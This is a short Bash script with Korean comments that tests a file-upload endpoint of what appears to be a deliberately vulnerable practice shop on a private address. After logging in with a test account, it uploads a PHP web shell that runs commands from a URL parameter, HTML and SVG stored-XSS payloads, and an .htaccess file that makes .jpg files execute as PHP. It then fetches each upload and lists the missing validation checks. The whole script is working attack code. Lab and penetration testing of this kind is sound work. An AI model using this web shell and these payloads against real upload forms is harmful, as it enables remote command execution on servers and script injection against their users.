#!/bin/bash
# 파일 업로드 취약점 테스트 스크립트
# 타겟: VULN SHOP 프로필 이미지 업로드

TARGET="http://192.168.0.28:3000"
COOKIES="/tmp/cookies.txt"

echo "=== 파일 업로드 취약점 테스트 ==="
echo "타겟: $TARGET/profile/upload"
echo ""

# 로그인
echo "[준비] 로그인 수행..."
curl -s -X POST "$TARGET/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=testuser456&password=test456" \
  -c "$COOKIES" > /dev/null

# 테스트 1: PHP 웹쉘 업로드
echo "[테스트 1] PHP 웹쉘 업로드"
echo '<?php system($_GET["cmd"]); ?>' > /tmp/test_shell.php
curl -s -X POST "$TARGET/profile/upload" \
  -F "profile_image=@/tmp/test_shell.php" \
  -b "$COOKIES" > /dev/null
echo "업로드된 파일 확인:"
curl -s "$TARGET/uploads/test_shell.php"
echo ""

# 테스트 2: HTML 파일 업로드 (XSS)
echo "[테스트 2] HTML 파일 업로드 (Stored XSS)"
echo '<script>alert("XSS")</script>' > /tmp/test_xss.html
curl -s -X POST "$TARGET/profile/upload" \
  -F "profile_image=@/tmp/test_xss.html" \
  -b "$COOKIES" > /dev/null
echo "업로드된 파일 확인:"
curl -s "$TARGET/uploads/test_xss.html"
echo ""

# 테스트 3: SVG 파일 업로드 (XSS)
echo "[테스트 3] SVG 파일 업로드 (XSS)"
echo '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>' > /tmp/test_xss.svg
curl -s -X POST "$TARGET/profile/upload" \
  -F "profile_image=@/tmp/test_xss.svg" \
  -b "$COOKIES" > /dev/null
echo "업로드된 파일 확인:"
curl -s "$TARGET/uploads/test_xss.svg"
echo ""

# 테스트 4: .htaccess 업로드 시도
echo "[테스트 4] .htaccess 파일 업로드 시도"
echo 'AddType application/x-httpd-php .jpg' > /tmp/.htaccess
curl -s -X POST "$TARGET/profile/upload" \
  -F "profile_image=@/tmp/.htaccess" \
  -b "$COOKIES" > /dev/null
echo "업로드 결과 확인 완료"
echo ""

echo "=== 결과 ==="
echo "- 파일 확장자 검증 없음"
echo "- 파일 내용(MIME) 검증 없음"
echo "- 실행 가능한 파일 업로드 가능"
echo "- 업로드 경로: /uploads/[filename]"
